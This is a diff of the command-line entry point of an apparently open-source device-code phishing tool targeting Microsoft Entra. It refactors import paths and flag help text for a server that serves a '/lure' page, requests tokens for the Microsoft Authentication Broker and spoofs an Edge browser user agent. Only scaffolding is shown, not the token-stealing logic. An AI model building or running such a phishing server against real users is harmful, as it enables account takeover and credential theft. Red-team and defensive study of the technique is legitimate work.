@@ -1,11 +1,11 @@
 package cmd
 
 import (
+	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
+	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
 	"github.com/spf13/cobra"
 	"log"
 	"log/slog"
-	"main/pkg/entra"
-	"main/pkg/utils"
 	"net/http"
 	"time"
 )
@@ -23,16 +23,16 @@ var (
 
 func init() {
 	rootCmd.AddCommand(runCmd)
-	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Provide the listening address (Default ':8080').")
-	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", EdgeOnWindows, "User-Agent string sent in HTTP requests (Default Edge on Windows).")
-	runCmd.Flags().StringVarP(&clientId, "client-id", "c", MsAuthenticationBroker, "ClientId to request token for. (Default Microsoft Authentication Broker)")
-	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Tenant to request token for. (Default 'common')")
+	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Provide the servers listening address")
+	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", EdgeOnWindows, "User-Agent used by HeadlessBrowser & API calls")
+	runCmd.Flags().StringVarP(&clientId, "client-id", "c", MsAuthenticationBroker, "ClientId for requesting token")
+	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Tenant for requesting token")
 }
 
 var runCmd = &cobra.Command{
 	Use:   "server",
 	Short: "Starts the phishing server",
-	Long:  "Starts the phishing server by default on http://localhost:8080/lure",
+	Long:  "Starts the phishing server. Listens by default on http://localhost:8080/lure",
 	Run: func(cmd *cobra.Command, args []string) {
 		// Set up a resource handler
 		http.HandleFunc("/lure", lureHandler)
